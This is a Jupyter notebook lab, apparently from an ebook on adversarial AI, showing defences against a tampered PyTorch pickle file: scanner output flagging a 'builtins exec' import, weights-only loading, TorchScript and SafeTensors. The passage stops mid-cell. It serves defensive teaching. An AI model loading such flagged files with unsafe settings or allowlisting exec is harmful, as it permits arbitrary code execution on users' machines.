{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "ccaebff2",
   "metadata": {},
   "source": [
    "<img style=\"max-width:20em; height:auto;\" src=\"../graphics/A-Little-Book-on-Adversarial-AI-Cover.png\"/>"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "80b668d8",
   "metadata": {},
   "source": [
    "Author: Nik Alleyne   \n",
    "Author Blog: https://www.securitynik.com   \n",
    "Author GitHub: github.com/securitynik   \n",
    "\n",
    "Author Other Books: [   \n",
    "\n",
    "            \"https://www.amazon.ca/Learning-Practicing-Leveraging-Practical-Detection/dp/1731254458/\",   \n",
    "            \n",
    "            \"https://www.amazon.ca/Learning-Practicing-Mastering-Network-Forensics/dp/1775383024/\"   \n",
    "        ]   \n",
    "\n",
    "\n",
    "This notebook ***(fickling_mitigations.ipynb)*** is part of the series of notebooks From ***A Little Book on Adversarial AI***  A free ebook released by Nik Alleyne"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "03f61295",
   "metadata": {},
   "source": [
    "### Fickling Mitigations "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "fddb7f96",
   "metadata": {},
   "source": [
    "### Lab Objectives:   \n",
    "- Implement mitigations to address the pickle file format vulnerability   \n",
    "- Look at additional ways to address the risk associated with model modification   \n",
    "\n",
    "\n",
    "### Step 1:  "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "0b977b05",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Import some libraries\n",
    "import torch\n",
    "import torch.nn as nn\n",
    "import torch.nn.functional as F"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "e2ba3cd2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Torch version used:  2.7.1+cu128\n"
     ]
    }
   ],
   "source": [
    "### Version of key libraries used  \n",
    "print(f'Torch version used:  {torch.__version__}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "f16ebaf2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Setting the device to cuda\n"
     ]
    }
   ],
   "source": [
    "# Setup the device to work with\n",
    "# This should ensure if there are accelerators in place, such as Apple backend or CUDA, \n",
    "# we should be able to take advantage of it.\n",
    "\n",
    "if torch.cuda.is_available():\n",
    "    print('Setting the device to cuda')\n",
    "    device = 'cuda'\n",
    "elif torch.backends.mps.is_available():\n",
    "    print('Setting the device to Apple mps')\n",
    "    device = 'mps'\n",
    "else:\n",
    "    print('Setting the device to CPU')\n",
    "    device = torch.device('cpu')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "a69a165f",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Recall all the models we use and pickle scan them\n",
    "# target both file and directory"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "702e206f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/tmp/my_trusted_simple_model.pth:my_trusted_simple_model/data.pkl: dangerous import 'builtins exec' FOUND\n",
      "----------- SCAN SUMMARY -----------\n",
      "Scanned files: 1\n",
      "Infected files: 1\n",
      "Dangerous globals: 1\n"
     ]
    }
   ],
   "source": [
    "# Let's start with scanning\n",
    "# We see it is reporting about dangerous imports\n",
    "# Specifically the **exec** command\n",
    "!picklescan --path /tmp/my_trusted_simple_model.pth"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "8633f66b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Error: No pickle files detected\n"
     ]
    }
   ],
   "source": [
    "# We can also use the fickling library that was used to create the malicious pickle to trace it\n",
    "# Interesting. We know we compromised this file\n",
    "# Also above, it reports infected\n",
    "# We used trace earlier on pickle file, this is using Torch's new zip format\n",
    "!fickling --trace /tmp/my_trusted_simple_model.pth"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "id": "fc89683d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/bin/bash: line 1: modelscan: command not found\n"
     ]
    }
   ],
   "source": [
    "# let us try another tool.\n",
    "# This time we use modelscan\n",
    "!modelscan -p /tmp/my_trusted_simple_model.pth"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "id": "6813de9d",
   "metadata": {},
   "outputs": [],
   "source": [
    "#We can build on this with static analysis by running strings on our samples\n",
    "#!strings --all --bytes=10 /tmp/r_forest.onnx"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "01d89371",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "00000000: \u001b[1;31m08\u001b[0m\u001b[1;33m0a\u001b[0m \u001b[1;31m12\u001b[0m\u001b[1;31m08\u001b[0m \u001b[1;32m73\u001b[0m\u001b[1;32m6b\u001b[0m \u001b[1;32m6c\u001b[0m\u001b[1;32m32\u001b[0m \u001b[1;32m6f\u001b[0m\u001b[1;32m6e\u001b[0m \u001b[1;32m6e\u001b[0m\u001b[1;32m78\u001b[0m \u001b[1;31m1a\u001b[0m\u001b[1;31m06\u001b[0m \u001b[1;32m31\u001b[0m\u001b[1;32m2e\u001b[0m  \u001b[1;31m.\u001b[0m\u001b[1;33m.\u001b[0m\u001b[1;31m.\u001b[0m\u001b[1;31m.\u001b[0m\u001b[1;32ms\u001b[0m\u001b[1;32mk\u001b[0m\u001b[1;32ml\u001b[0m\u001b[1;32m2\u001b[0m\u001b[1;32mo\u001b[0m\u001b[1;32mn\u001b[0m\u001b[1;32mn\u001b[0m\u001b[1;32mx\u001b[0m\u001b[1;31m.\u001b[0m\u001b[1;31m.\u001b[0m\u001b[1;32m1\u001b[0m\u001b[1;32m.\u001b[0m\n",
      "00000010: \u001b[1;32m31\u001b[0m\u001b[1;32m39\u001b[0m \u001b[1;32m2e\u001b[0m\u001b[1;32m31\u001b[0m \u001b[1;32m22\u001b[0m\u001b[1;31m07\u001b[0m \u001b[1;32m61\u001b[0m\u001b[1;32m69\u001b[0m \u001b[1;32m2e\u001b[0m\u001b[1;32m6f\u001b[0m \u001b[1;32m6e\u001b[0m\u001b[1;32m6e\u001b[0m \u001b[1;32m78\u001b[0m\u001b[1;32m28\u001b[0m \u001b[1;37m00\u001b[0m\u001b[1;32m32\u001b[0m  \u001b[1;32m1\u001b[0m\u001b[1;32m9\u001b[0m\u001b[1;32m.\u001b[0m\u001b[1;32m1\u001b[0m\u001b[1;32m\"\u001b[0m\u001b[1;31m.\u001b[0m\u001b[1;32ma\u001b[0m\u001b[1;32mi\u001b[0m\u001b[1;32m.\u001b[0m\u001b[1;32mo\u001b[0m\u001b[1;32mn\u001b[0m\u001b[1;32mn\u001b[0m\u001b[1;32mx\u001b[0m\u001b[1;32m(\u001b[0m\u001b[1;37m.\u001b[0m\u001b[1;32m2\u001b[0m\n",
      "00000020: \u001b[1;37m00\u001b[0m\u001b[1;32m3a\u001b[0m \u001b[1;31md7\u001b[0m\u001b[1;31m95\u001b[0m \u001b[1;31m05\u001b[0m\u001b[1;33m0a\u001b[0m \u001b[1;31md8\u001b[0m\u001b[1;31m93\u001b[0m \u001b[1;31m05\u001b[0m\u001b[1;33m0a\u001b[0m \u001b[1;31m01\u001b[0m\u001b[1;32m58\u001b[0m \u001b[1;31m12\u001b[0m\u001b[1;31m05\u001b[0m \u001b[1;32m6c\u001b[0m\u001b[1;32m61\u001b[0m  \u001b[1;37m.\u001b[0m\u001b[1;32m:\u001b[0m\u001b[1;31m.\u001b[0m\u001b[1;31m.\u001b[0m\u001b[1;31m.\u001b[0m\u001b[1;33m.\u001b[0m\u001b[1;31m.\u001b[0m\u001b[1;31m.\u001b[0m\u001b[1;31m.\u001b[0m\u001b[1;33m.\u001b[0m\u001b[1;31m.\u001b[0m\u001b[1;32mX\u001b[0m\u001b[1;31m.\u001b[0m\u001b[1;31m.\u001b[0m\u001b[1;32ml\u001b[0m\u001b[1;32ma\u001b[0m\n",
      "00000030: \u001b[1;32m62\u001b[0m\u001b[1;32m65\u001b[0m \u001b[1;32m6c\u001b[0m\u001b[1;31m12\u001b[0m \u001b[1;33m0d\u001b[0m\u001b[1;32m70\u001b[0m \u001b[1;32m72\u001b[0m\u001b[1;32m6f\u001b[0m \u001b[1;32m62\u001b[0m\u001b[1;32m61\u001b[0m \u001b[1;32m62\u001b[0m\u001b[1;32m69\u001b[0m \u001b[1;32m6c\u001b[0m\u001b[1;32m69\u001b[0m \u001b[1;32m74\u001b[0m\u001b[1;32m69\u001b[0m  \u001b[1;32mb\u001b[0m\u001b[1;32me\u001b[0m\u001b[1;32ml\u001b[0m\u001b[1;31m.\u001b[0m\u001b[1;33m.\u001b[0m\u001b[1;32mp\u001b[0m\u001b[1;32mr\u001b[0m\u001b[1;32mo\u001b[0m\u001b[1;32mb\u001b[0m\u001b[1;32ma\u001b[0m\u001b[1;32mb\u001b[0m\u001b[1;32mi\u001b[0m\u001b[1;32ml\u001b[0m\u001b[1;32mi\u001b[0m\u001b[1;32mt\u001b[0m\u001b[1;32mi\u001b[0m\n"
     ]
    }
   ],
   "source": [
    "#If you are interested, you can also look at the raw bytes via a hex editor  \n",
    "!xxd -l 64 /tmp/r_forest.onnx"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "f21ecdf7",
   "metadata": {},
   "outputs": [
    {
     "ename": "UnpicklingError",
     "evalue": "Weights only load failed. This file can still be loaded, to do so you have two options, \u001b[1mdo those steps only if you trust the source of the checkpoint\u001b[0m. \n\t(1) In PyTorch 2.6, we changed the default value of the `weights_only` argument in `torch.load` from `False` to `True`. Re-running `torch.load` with `weights_only` set to `False` will likely succeed, but it can result in arbitrary code execution. Do it only if you got the file from a trusted source.\n\t(2) Alternatively, to load with `weights_only=True` please check the recommended steps in the following error message.\n\tWeightsUnpickler error: Unsupported global: GLOBAL exec was not an allowed global by default. Please use `torch.serialization.add_safe_globals([exec])` or the `torch.serialization.safe_globals([exec])` context manager to allowlist this global if you trust this class/function.\n\nCheck the documentation of torch.load to learn more about types accepted by default with weights_only https://pytorch.org/docs/stable/generated/torch.load.html.",
     "output_type": "error",
     "traceback": [
      "\u001b[31m---------------------------------------------------------------------------\u001b[39m",
      "\u001b[31mUnpicklingError\u001b[39m                           Traceback (most recent call last)",
      "\u001b[36mCell\u001b[39m\u001b[36m \u001b[39m\u001b[32mIn[10]\u001b[39m\u001b[32m, line 5\u001b[39m\n\u001b[32m      1\u001b[39m \u001b[38;5;66;03m# First, we can ensure if we don't trust the source of the model, \u001b[39;00m\n\u001b[32m      2\u001b[39m \u001b[38;5;66;03m# that we load only the weights and not the full model\u001b[39;00m\n\u001b[32m      3\u001b[39m \u001b[38;5;66;03m# This can be achieved by\u001b[39;00m\n\u001b[32m      4\u001b[39m \u001b[38;5;28;01mwith\u001b[39;00m torch.no_grad():\n\u001b[32m----> \u001b[39m\u001b[32m5\u001b[39m     loaded_trusted_pwnd_model = \u001b[43mtorch\u001b[49m\u001b[43m.\u001b[49m\u001b[43mload\u001b[49m\u001b[43m(\u001b[49m\u001b[33;43m'\u001b[39;49m\u001b[33;43m/tmp/my_trusted_simple_model.pth\u001b[39;49m\u001b[33;43m'\u001b[39;49m\u001b[43m,\u001b[49m\u001b[43m \u001b[49m\u001b[43mweights_only\u001b[49m\u001b[43m=\u001b[49m\u001b[38;5;28;43;01mTrue\u001b[39;49;00m\u001b[43m)\u001b[49m\n\u001b[32m      7\u001b[39m \u001b[38;5;66;03m#loaded_trusted_pwnd_model\u001b[39;00m\n",
      "\u001b[36mFile \u001b[39m\u001b[32m~/miniconda3/envs/adversarial_ai/lib/python3.12/site-packages/torch/serialization.py:1524\u001b[39m, in \u001b[36mload\u001b[39m\u001b[34m(f, map_location, pickle_module, weights_only, mmap, **pickle_load_args)\u001b[39m\n\u001b[32m   1516\u001b[39m                 \u001b[38;5;28;01mreturn\u001b[39;00m _load(\n\u001b[32m   1517\u001b[39m                     opened_zipfile,\n\u001b[32m   1518\u001b[39m                     map_location,\n\u001b[32m   (...)\u001b[39m\u001b[32m   1521\u001b[39m                     **pickle_load_args,\n\u001b[32m   1522\u001b[39m                 )\n\u001b[32m   1523\u001b[39m             \u001b[38;5;28;01mexcept\u001b[39;00m pickle.UnpicklingError \u001b[38;5;28;01mas\u001b[39;00m e:\n\u001b[32m-> \u001b[39m\u001b[32m1524\u001b[39m                 \u001b[38;5;28;01mraise\u001b[39;00m pickle.UnpicklingError(_get_wo_message(\u001b[38;5;28mstr\u001b[39m(e))) \u001b[38;5;28;01mfrom\u001b[39;00m\u001b[38;5;250m \u001b[39m\u001b[38;5;28;01mNone\u001b[39;00m\n\u001b[32m   1525\u001b[39m         \u001b[38;5;28;01mreturn\u001b[39;00m _load(\n\u001b[32m   1526\u001b[39m             opened_zipfile,\n\u001b[32m   1527\u001b[39m             map_location,\n\u001b[32m   (...)\u001b[39m\u001b[32m   1530\u001b[39m             **pickle_load_args,\n\u001b[32m   1531\u001b[39m         )\n\u001b[32m   1532\u001b[39m \u001b[38;5;28;01mif\u001b[39;00m mmap:\n",
      "\u001b[31mUnpicklingError\u001b[39m: Weights only load failed. This file can still be loaded, to do so you have two options, \u001b[1mdo those steps only if you trust the source of the checkpoint\u001b[0m. \n\t(1) In PyTorch 2.6, we changed the default value of the `weights_only` argument in `torch.load` from `False` to `True`. Re-running `torch.load` with `weights_only` set to `False` will likely succeed, but it can result in arbitrary code execution. Do it only if you got the file from a trusted source.\n\t(2) Alternatively, to load with `weights_only=True` please check the recommended steps in the following error message.\n\tWeightsUnpickler error: Unsupported global: GLOBAL exec was not an allowed global by default. Please use `torch.serialization.add_safe_globals([exec])` or the `torch.serialization.safe_globals([exec])` context manager to allowlist this global if you trust this class/function.\n\nCheck the documentation of torch.load to learn more about types accepted by default with weights_only https://pytorch.org/docs/stable/generated/torch.load.html."
     ]
    }
   ],
   "source": [
    "# First, we can ensure if we don't trust the source of the model, \n",
    "# that we load only the weights and not the full model\n",
    "# This can be achieved by\n",
    "with torch.no_grad():\n",
    "    loaded_trusted_pwnd_model = torch.load('/tmp/my_trusted_simple_model.pth', weights_only=True)\n",
    "    \n",
    "#loaded_trusted_pwnd_model\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e0959a1e",
   "metadata": {},
   "source": [
    "Above fails. Which means we will not be able to use this model if we try loading the weight only. However, place close attention to the last few lines  \n",
    "As see above in the last few lines, there is the message about  \n",
    "**WeightsUnpickler error: Unsupported global: GLOBAL builtins.exec was not an allowed global by default**  \n",
    "This immediately tells us there might be a potential problem here. Also we see  \n",
    "Re-running `torch.load` with `weights_only` set to `False` will likely succeed, **but it can result in arbitrary code execution. Do it only if you got the file from a trusted source.**\n",
    "\n",
    "So above, we were able to run arbitrary code because we had *weights_only=False*   \n",
    "\n",
    "\n",
    "### Step 2:   "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "8ac1f895",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Bring back some data\n",
    "# Create a dummy model\n",
    "from sklearn.datasets import make_classification\n",
    "\n",
    "X, y = make_classification(n_samples=100, n_classes=2, random_state=10)\n",
    "X = torch.tensor(data=X, dtype=torch.float32, device=device)\n",
    "y = torch.tensor(data = y.reshape(-1, 1), dtype=torch.float32, device=device)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "d3ec76e1",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Re-create a simple torch network\n",
    "class SimpleNet(nn.Module):\n",
    "    def __init__(self,):\n",
    "        super().__init__()\n",
    "        self.layers = nn.Sequential( \n",
    "            nn.Linear(in_features=X.size(dim=1), out_features=8),\n",
    "            nn.ReLU(),\n",
    "            nn.Linear(in_features=8, out_features=1),\n",
    "            nn.Sigmoid()\n",
    "        )\n",
    "    \n",
    "    def forward(self, x):\n",
    "        out = self.layers(x)\n",
    "        return out"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "7c916898",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "tensor([[0.5052],\n",
       "        [0.4907],\n",
       "        [0.4782],\n",
       "        [0.3982],\n",
       "        [0.3448],\n",
       "        [0.3816],\n",
       "        [0.4295],\n",
       "        [0.5640],\n",
       "        [0.3775],\n",
       "        [0.5036]], device='cuda:0', grad_fn=<SliceBackward0>)"
      ]
     },
     "execution_count": 13,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# If you wish to test the model's availaility to make predictions\n",
    "simple_net = SimpleNet().to(device=device)\n",
    "simple_net(X)[:10]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "id": "46cdff91",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/tmp/my_more_secured_model.pth\n",
      "1bd188e550f27eefb2945228d41b1378  /tmp/my_more_secured_model.pth\n"
     ]
    }
   ],
   "source": [
    "# Let's try a different approach. I RECOMMEND USING THIS!\n",
    "# In this instance, let's use Torchscript.\n",
    "# Torchscript is a very common way to use the model to make inference\n",
    "# Generally when we save our model, it is for someone else to use to make inference.\n",
    "# Let's use that format instead\n",
    "\n",
    "simple_model = SimpleNet().to(device=device)\n",
    "more_secured_model = torch.jit.script(obj=simple_model)\n",
    "more_secured_model.save(f='/tmp/my_more_secured_model.pth')\n",
    "\n",
    "# Verify the file was created\n",
    "!ls /tmp/my_more_secured_model.pth\n",
    "\n",
    "# Get the file integrity\n",
    "!md5sum /tmp/my_more_secured_model.pth\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "f7adc669",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "RecursiveScriptModule(\n",
       "  original_name=SimpleNet\n",
       "  (layers): RecursiveScriptModule(\n",
       "    original_name=Sequential\n",
       "    (0): RecursiveScriptModule(original_name=Linear)\n",
       "    (1): RecursiveScriptModule(original_name=ReLU)\n",
       "    (2): RecursiveScriptModule(original_name=Linear)\n",
       "    (3): RecursiveScriptModule(original_name=Sigmoid)\n",
       "  )\n",
       ")"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# We can then load this model to make inference\n",
    "loaded_secured_model = torch.jit.load(f='/tmp/my_more_secured_model.pth', map_location=device)\n",
    "loaded_secured_model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "id": "661a70eb",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "tensor([[0.6325],\n",
       "        [0.5591],\n",
       "        [0.5844],\n",
       "        [0.5642],\n",
       "        [0.5455]], device='cuda:0', grad_fn=<SigmoidBackward0>)"
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Put the model in eval mode\n",
    "# We call the .eval method to disable any batch normalization, dropout, etc\n",
    "# In this case we don't have those layers\n",
    "# However, it is a good habit to call this method\n",
    "loaded_secured_model.eval()\n",
    "\n",
    "# Make a sample prediction, to confirm the modem is working well\n",
    "loaded_secured_model(X[:5])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e69c400a",
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "id": "e204b335",
   "metadata": {},
   "source": [
    "### Step 3:   \n",
    "\n",
    "# SafeTensors  \n",
    "- https://huggingface.co/docs/safetensors/index\n",
    "- https://github.com/huggingface/safetensors\n",
    "- Alternatively, we can use SafeTensors\n",
    "- This is a format that is gaining popularity. It does require a bit more work but let's understand the work"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "b7125f79",
   "metadata": {},
   "outputs": [],
   "source": [
    "# importing the safetensors library\n",
    "from safetensors.torch import save_file, safe_open"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "id": "35ba7556",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<bound method Module.state_dict of SimpleNet(\n",
       "  (layers): Sequential(\n",
       "    (0): Linear(in_features=20, out_features=8, bias=True)\n",
       "    (1): ReLU()\n",
       "    (2): Linear(in_features=8, out_features=1, bias=True)\n",
       "    (3): Sigmoid()\n",
       "  )\n",
       ")>"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Verify the layers we have\n",
    "simple_model.state_dict"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "id": "c9442492",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Grab a sample parameter from each layer\n",
    "tmp_safe_tensor = {\n",
    "    'fc1.weight' : simple_model.layers[0].weight,\n",
    "    'fc1.bias' : simple_model.layers[0].bias\n",
    "}\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "558ae982",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'layers.0.weight': tensor([[ 0.1340,  0.0428,  0.1601,  0.1333,  0.1239,  0.1645, -0.0590, -0.1074,\n",
       "          -0.0420,  0.1007, -0.0829, -0.0661,  0.1732, -0.0977, -0.0719,  0.1165,\n",
       "           0.1505,  0.1343,  0.0481, -0.0843],\n",
       "         [-0.1467, -0.0027, -0.1441, -0.2104,  0.1514, -0.1792,  0.2200, -0.1609,\n",
       "           0.2206, -0.1045,  0.2210, -0.2003,  0.0717,  0.1599, -0.1202, -0.0942,\n",
       "           0.0315, -0.0715, -0.1693, -0.1950],\n",
       "         [-0.0473,  0.1902, -0.0504, -0.0600,  0.0421, -0.0924,  0.2086,  0.0063,\n",
       "           0.0369, -0.1246, -0.0786, -0.0630, -0.0231, -0.1015, -0.0784,  0.1539,\n",
       "           0.1334,  0.1037,  0.2185,  0.1916],\n",
       "         [-0.0980, -0.0822, -0.1821, -0.0688,  0.1837, -0.1766, -0.0271,  0.0261,\n",
       "           0.1777, -0.1705, -0.0655, -0.2209,  0.0266,  0.0619, -0.2003, -0.1742,\n",
       "           0.0639, -0.0142,  0.0181,  0.1082],\n",
       "         [-0.1875,  0.1406,  0.0788,  0.0143,  0.1283, -0.1361,  0.1421, -0.0797,\n",
       "          -0.1659,  0.0244, -0.0199, -0.0388, -0.0943,  0.2181,  0.1142, -0.1319,\n",
       "           0.0283,  0.2181, -0.0241, -0.1028],\n",
       "         [-0.0042,  0.0178, -0.1108, -0.0063, -0.1714, -0.2015,  0.2016,  0.0446,\n",
       "          -0.1593,  0.2097, -0.0993,  0.1599, -0.2166, -0.0775,  0.0228, -0.0550,\n",
       "           0.1022,  0.0302, -0.0059, -0.2084],\n",
       "         [ 0.1215, -0.1489, -0.1144, -0.1513, -0.0203, -0.0537, -0.0629, -0.1812,\n",
       "           0.1512,  0.0012,  0.1782,  0.2019, -0.1126, -0.0239,  0.1764,  0.1439,\n",
       "          -0.0854,  0.0567,  0.0538,  0.1173],\n",
       "         [-0.1364,  0.1849,  0.1562, -0.1611,  0.0054,  0.0036,  0.0418,  0.2001,\n",
       "           0.2033, -0.0175,  0.0524, -0.1832, -0.2226,  0.2213, -0.0767,  0.1996,\n",
       "          -0.0008, -0.2090, -0.0575, -0.1912]], device='cuda:0'),\n",
       " 'layers.0.bias': tensor([-0.1662,  0.2066,  0.1746,  0.1116, -0.0554, -0.0147,  0.0900, -0.1279],\n",
       "        device='cuda:0'),\n",
       " 'layers.2.weight': tensor([[-0.2806,  0.2206, -0.1718,  0.3084, -0.3361, -0.2576,  0.2124,  0.0040]],\n",
       "        device='cuda:0'),\n",
       " 'layers.2.bias': tensor([0.2077], device='cuda:0')}"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Now the reality is, no one wants to do that for a model that has many layers, let's make this a bit simpler\n",
    "# Setup an empty dictionary\n",
    "simple_model_safe_tensors = {}\n",
    "\n",
    "# Automate the process of creating the keys and values\n",
    "for item in simple_model.state_dict().items():\n",
    "    simple_model_safe_tensors[item[0]] = item[1]\n",
    "\n",
    "# Verify the dictionary has been properly created\n",
    "simple_model_safe_tensors"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "deda170f",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/tmp/simple_model.safetensors\n",
      "fe1c568f98808892213f7ee4e9cc2437  /tmp/simple_model.safetensors\n"
     ]
    }
   ],
   "source": [
    "# Now let's save the model\n",
    "# We add some metadata if we want via a dictionary\n",
    "save_file(tensors=simple_model_safe_tensors, filename=r'/tmp/simple_model.safetensors', metadata={'Author' : 'SecurityNik', 'course': 'SANS SEC 5'})\n",
    "\n",
    "# Verify the file is saved\n",
    "!ls /tmp/simple_model.safetensors\n",
    "\n",
    "# Verify the file integrity\n",
    "!md5sum /tmp/simple_model.safetensors\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "df550909",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'layers.0.bias': tensor([-0.1662,  0.2066,  0.1746,  0.1116, -0.0554, -0.0147,  0.0900, -0.1279]),\n",
       " 'layers.0.weight': tensor([[ 0.1340,  0.0428,  0.1601,  0.1333,  0.1239,  0.1645, -0.0590, -0.1074,\n",
       "          -0.0420,  0.1007, -0.0829, -0.0661,  0.1732, -0.0977, -0.0719,  0.1165,\n",
       "           0.1505,  0.1343,  0.0481, -0.0843],\n",
       "         [-0.1467, -0.0027, -0.1441, -0.2104,  0.1514, -0.1792,  0.2200, -0.1609,\n",
       "           0.2206, -0.1045,  0.2210, -0.2003,  0.0717,  0.1599, -0.1202, -0.0942,\n",
       "           0.0315, -0.0715, -0.1693, -0.1950],\n",
       "         [-0.0473,  0.1902, -0.0504, -0.0600,  0.0421, -0.0924,  0.2086,  0.0063,\n",
       "           0.0369, -0.1246, -0.0786, -0.0630, -0.0231, -0.1015, -0.0784,  0.1539,\n",
       "           0.1334,  0.1037,  0.2185,  0.1916],\n",
       "         [-0.0980, -0.0822, -0.1821, -0.0688,  0.1837, -0.1766, -0.0271,  0.0261,\n",
       "           0.1777, -0.1705, -0.0655, -0.2209,  0.0266,  0.0619, -0.2003, -0.1742,\n",
       "           0.0639, -0.0142,  0.0181,  0.1082],\n",
       "         [-0.1875,  0.1406,  0.0788,  0.0143,  0.1283, -0.1361,  0.1421, -0.0797,\n",
       "          -0.1659,  0.0244, -0.0199, -0.0388, -0.0943,  0.2181,  0.1142, -0.1319,\n",
       "           0.0283,  0.2181, -0.0241, -0.1028],\n",
       "         [-0.0042,  0.0178, -0.1108, -0.0063, -0.1714, -0.2015,  0.2016,  0.0446,\n",
       "          -0.1593,  0.2097, -0.0993,  0.1599, -0.2166, -0.0775,  0.0228, -0.0550,\n",
       "           0.1022,  0.0302, -0.0059, -0.2084],\n",
       "         [ 0.1215, -0.1489, -0.1144, -0.1513, -0.0203, -0.0537, -0.0629, -0.1812,\n",
       "           0.1512,  0.0012,  0.1782,  0.2019, -0.1126, -0.0239,  0.1764,  0.1439,\n",
       "          -0.0854,  0.0567,  0.0538,  0.1173],\n",
       "         [-0.1364,  0.1849,  0.1562, -0.1611,  0.0054,  0.0036,  0.0418,  0.2001,\n",
       "           0.2033, -0.0175,  0.0524, -0.1832, -0.2226,  0.2213, -0.0767,  0.1996,\n",
       "          -0.0008, -0.2090, -0.0575, -0.1912]]),\n",
       " 'layers.2.bias': tensor([0.2077]),\n",
       " 'layers.2.weight': tensor([[-0.2806,  0.2206, -0.1718,  0.3084, -0.3361, -0.2576,  0.2124,  0.0040]])}"
      ]
     },
     "execution_count": 22,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Fine, let's reload the model now to make predictions.\n",
    "loaded_safe_tensor_state_dict = {}\n",
    "with safe_open(filename=r'/tmp/simple_model.safetensors', framework='pt') as safe_model:\n",
    "    for key in safe_model.keys():\n",
    "        loaded_safe_tensor_state_dict[key] = safe_model.get_tensor(key)\n",
    "\n",
    "# View the loaded model\n",
    "loaded_safe_tensor_state_dict"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "e874d0c8",
   "metadata": {},
   "outputs": [],
   "source": [
    "# Re-create a simple torch network\n",
    "class SimpleModelReconstructed(nn.Module):\n",
    "    def __init__(self,):\n",
    "        super().__init__()\n",
    "        self.layers = nn.Sequential( \n",
    "            nn.Linear(in_features=X.size(dim=1), out_features=8),\n",
    "            nn.ReLU(),\n",
    "            nn.Linear(in_features=8, out_features=1),\n",
    "            nn.Sigmoid()\n",
    "        )\n",
    "    \n",
    "    def forward(self, x):\n",
    "        out = self.layers(x)\n",
    "        return out"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "92f69d97",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "SimpleModelReconstructed(\n",
       "  (layers): Sequential(\n",
       "    (0): Linear(in_features=20, out_features=8, bias=True)\n",
       "    (1): ReLU()\n",
       "    (2): Linear(in_features=8, out_features=1, bias=True)\n",
       "    (3): Sigmoid()\n",
       "  )\n",
       ")"
      ]
     },
     "execution_count": 24,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Instantiate the model\n",
    "simple_model_reconstructed = SimpleModelReconstructed().to(device=device)\n",
    "simple_model_reconstructed"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "06aeccb0",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<All keys matched successfully>"
      ]
     },
     "execution_count": 25,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Load the state dictionary\n",
